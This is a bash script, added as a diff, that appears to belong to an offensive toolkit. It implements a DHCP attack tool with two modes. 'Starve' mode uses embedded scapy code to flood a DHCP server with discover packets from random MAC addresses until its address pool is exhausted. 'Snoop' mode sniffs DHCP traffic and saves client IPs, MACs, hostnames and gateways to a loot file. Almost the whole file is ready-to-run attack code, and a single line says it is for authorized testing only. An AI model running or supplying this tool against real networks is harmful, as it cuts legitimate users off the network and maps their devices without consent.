@@ -1,0 +1,150 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/dhcp-attack
+# DHCP Starvation + DHCP Snooping
+# Ported from Raspyjack dhcp_starve.py + dhcp_snoop.py (7h30th3r0n3)
+#
+# starve  — flood DHCP server with random MACs to exhaust its pool
+# snoop   — passively map every client/hostname/gateway from DHCP traffic
+#
+# Usage: dhcp-attack <starve|snoop> [iface]
+#
+# Deps: python3-scapy — apt install python3-scapy
+
+MODE="${1:-help}"
+IFACE="${2:-eth0}"
+LOOT="/opt/cardputer/loot/recon"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+mkdir -p "$LOOT"
+
+RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'
+YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
+
+[ "$(id -u)" -ne 0 ] && { echo -e "${RED}[!] Root required.${NC}"; exit 1; }
+command -v python3 &>/dev/null || { echo -e "${RED}[!] python3 not found${NC}"; exit 1; }
+python3 -c "import scapy" 2>/dev/null \
+    || { echo -e "${RED}[!] scapy not found — apt install python3-scapy${NC}"; exit 1; }
+ip link show "$IFACE" &>/dev/null \
+    || { echo -e "${RED}[!] $IFACE not found${NC}"; exit 1; }
+
+case "$MODE" in
+starve|--starve|-s)
+    echo -e "${BOLD}${CYAN}━━━ DHCP STARVATION — ZERO-DAY OS ━━━${NC}"
+    echo -e "${CYAN}[*]${NC} Interface: $IFACE"
+    echo -e "${YELLOW}[!]${NC} Floods DHCP server with random MACs to exhaust lease pool."
+    echo -e "${YELLOW}[!]${NC} Authorized testing only. Ctrl+C to stop."
+    echo ""
+
+    python3 - "$IFACE" << 'PYEOF'
+import sys, time, random, struct, socket
+from scapy.all import (Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf)
+
+iface = sys.argv[1]
+conf.verb = 0
+sent = 0
+
+def rand_mac():
+    return ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
+
+def dhcp_discover(src_mac):
+    mac_bytes = bytes.fromhex(src_mac.replace(':',''))
+    return (
+        Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
+        IP(src='0.0.0.0', dst='255.255.255.255') /
+        UDP(sport=68, dport=67) /
+        BOOTP(chaddr=mac_bytes, xid=random.randint(0,0xFFFFFFFF)) /
+        DHCP(options=[('message-type','discover'), 'end'])
+    )
+
+print(f'\033[0;36m[*]\033[0m Sending DHCPDISCOVER floods on {iface} (Ctrl+C to stop)')
+try:
+    while True:
+        mac = rand_mac()
+        pkt = dhcp_discover(mac)
+        sendp(pkt, iface=iface, verbose=False)
+        sent += 1
+        if sent % 50 == 0:
+            print(f'\r\033[0;32m[+]\033[0m Sent {sent} DHCPDISCOVER packets', end='', flush=True)
+        time.sleep(0.05)
+except KeyboardInterrupt:
+    print(f'\n\033[0;36m[*]\033[0m Stopped. Total sent: {sent}')
+PYEOF
+    ;;
+
+snoop|--snoop|-p)
+    OUTFILE="$LOOT/dhcp_snoop_${TIMESTAMP}.json"
+    echo -e "${BOLD}${CYAN}━━━ DHCP SNOOP — ZERO-DAY OS ━━━${NC}"
+    echo -e "${CYAN}[*]${NC} Interface: $IFACE  Output: $OUTFILE"
+    echo -e "${CYAN}[*]${NC} Passively mapping DHCP clients, hostnames, gateway, DNS..."
+    echo -e "${CYAN}[*]${NC} Ctrl+C to stop and save"
+    echo ""
+    echo -e "  ${CYAN}IP              MAC                Hostname${NC}"
+    echo "  ──────────────────────────────────────────────────"
+
+    python3 - "$IFACE" "$OUTFILE" << 'PYEOF'
+import sys, json, time, signal
+from scapy.all import sniff, DHCP, BOOTP, Ether, conf
+conf.verb = 0
+
+iface, outfile = sys.argv[1], sys.argv[2]
+clients = {}
+
+def handle(pkt):
+    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)): return
+    opts = {opt[0]: opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple)}
+    mtype = opts.get('message-type', 0)
+
+    # DHCPACK (5) and DHCPREQUEST (3) have the juicy info
+    if mtype not in (3, 5): return
+
+    mac = pkt[Ether].src
+    ip  = pkt[BOOTP].yiaddr or pkt[BOOTP].ciaddr or ''
+    host = ''
+    if 'hostname' in opts:
+        h = opts['hostname']
+        host = h.decode() if isinstance(h, bytes) else str(h)
+
+    gw  = opts.get('router', b'')
+    dns = opts.get('domain-name-server', b'')
+    if isinstance(gw, bytes):  gw  = socket_fmt(gw)
+    if isinstance(dns, bytes): dns = socket_fmt(dns)
+
+    if mac and (ip or host):
+        clients[mac] = {'ip': ip, 'mac': mac, 'host': host,
+                        'gw': str(gw), 'dns': str(dns), 'seen': time.strftime('%H:%M:%S')}
+        print(f'\r  \033[0;36m{ip:<15}\033[0m  {mac}  \033[0;32m{host}\033[0m   ')
+        sys.stdout.flush()
+        with open(outfile, 'w') as f:
+            json.dump(list(clients.values()), f, indent=2)
+
+def socket_fmt(b):
+    try:
+        import socket
+        return socket.inet_ntoa(b[:4]) if len(b) >= 4 else str(b)
+    except: return str(b)
+
+def stop(sig, frame):
+    print(f'\n\033[0;36m[*]\033[0m Captured {len(clients)} clients → {outfile}')
+    # Print DHCP server info if we saw it
+    gws = set(c['gw'] for c in clients.values() if c['gw'] and c['gw'] != '0.0.0.0')
+    if gws: print(f'\033[0;36m[*]\033[0m Gateway(s): {", ".join(gws)}')
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, stop)
+sniff(iface=iface, filter='udp and (port 67 or port 68)', prn=handle, store=False)
+PYEOF
+    ;;
+
+*)
+    echo "Usage: dhcp-attack <mode> [iface]"
+    echo ""
+    echo "Modes:"
+    echo "  starve   — Exhaust DHCP pool (flood with random MACs)"
+    echo "  snoop    — Passive DHCP client/hostname/gateway map"
+    echo ""
+    echo "Examples:"
+    echo "  dhcp-attack starve eth0"
+    echo "  dhcp-attack snoop wlan0"
+    exit 1
+    ;;
+esac
